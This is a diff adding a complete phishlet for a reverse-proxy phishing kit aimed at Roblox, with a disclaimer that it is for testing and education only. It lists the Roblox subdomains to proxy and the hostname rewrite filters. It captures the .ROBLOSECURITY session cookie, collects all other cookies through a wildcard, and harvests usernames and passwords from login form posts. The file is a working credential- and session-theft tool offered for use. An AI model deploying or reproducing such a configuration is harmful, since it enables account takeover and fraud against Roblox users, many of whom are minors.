@@ -1,0 +1,71 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'roblox.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'assetgame', orig_sub: 'assetgame', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'metrics', orig_sub: 'metrics', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'realtime', orig_sub: 'realtime', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'locale', orig_sub: 'locale', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'accountsettings', orig_sub: 'accountsettings', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'rbxcdn.com', session: true, is_landing: false}
+  - {phish_sub: 'ecsv2', orig_sub: 'ecsv2', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'contacts', orig_sub: 'contacts', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'thumbnails', orig_sub: 'thumbnails', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'contacts', orig_sub: 'contacts', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'chat', orig_sub: 'chat', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'notifications', orig_sub: 'notifications', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'economy', orig_sub: 'economy', domain: 'roblox.com', session: true, is_landing: false}
+  - {phish_sub: 'friends', orig_sub: 'friends', domain: 'roblox.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.roblox.com', orig_sub: '', domain: 'roblox.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.roblox.com', orig_sub: '', domain: 'rbxcdn.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.roblox.com', orig_sub: 'www', domain: 'roblox.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.roblox.com', orig_sub: 'www', domain: 'roblox.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.roblox.com', orig_sub: 'www', domain: 'roblox.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.roblox.com', orig_sub: 'auth', domain: 'roblox.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.roblox.com', orig_sub: 'auth', domain: 'roblox.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.roblox.com', orig_sub: 'auth', domain: 'roblox.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.roblox.com', orig_sub: 'apis', domain: 'roblox.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.roblox.com', orig_sub: 'apis', domain: 'roblox.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.roblox.com', orig_sub: 'apis', domain: 'roblox.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.roblox.com', orig_sub: 'metrics', domain: 'roblox.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.roblox.com', orig_sub: 'metrics', domain: 'roblox.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.roblox.com', orig_sub: 'metrics', domain: 'roblox.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+auth_tokens:
+  - domain: '.roblox.com'
+    keys: ['GuestData', '.ROBLOSECURITY','RBXSessionTracker','.*,regexp']
+  - domain: '.www.roblox.com'
+    keys: ['gig_canary','gig_canary_ver' ,'.*,regexp']
+
+auth_urls:
+  - '/home'
+  - '/home/.*'
+credentials:
+  username:
+    key: 'cvalue'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'ctype'
+      search: '(.*)'
+      type: 'post'    
+    
+login:
+  domain: 'www.roblox.com'
+  path: '/Login'
